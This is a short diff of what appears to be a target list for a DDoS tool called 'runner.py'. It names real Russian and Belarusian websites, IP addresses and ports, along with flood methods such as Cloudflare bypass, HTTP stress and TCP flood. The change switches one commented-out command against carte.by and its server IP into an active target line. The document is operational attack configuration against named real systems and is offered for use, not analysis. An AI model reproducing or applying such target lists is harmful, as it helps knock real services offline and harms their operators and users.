@@ -6,7 +6,7 @@
 #runner.py http://rusvesna.su/ http://m.rusvesna.su/ --http-methods CFB CFBUAM
 
 # https://carte.by/vitebsk/dostavka/
-#runner.py https://carte.by/source/front/api.js https://carte.by/minsk/hpl/export/ https://carte.by/vitebsk/dostavka/ 193.176.182.165:80 193.176.182.165:443 tcp://193.176.182.165:80 tcp://193.176.182.165:443  -p 1200 --rpc 100 --http-methods get stress head --debug
+https://carte.by/source/front/api.js https://carte.by/minsk/hpl/export/ https://carte.by/vitebsk/dostavka/ 193.176.182.165:80 193.176.182.165:443 tcp://193.176.182.165:80 tcp://193.176.182.165:443  --http-methods BYPASS GET STRESS
 
 ### smotrim.ru https://t.me/c/1624648668/85
 #runner.py tcp://80.249.129.244:443 tcp://80.249.129.244:80  --http-methods TCP FLOOD
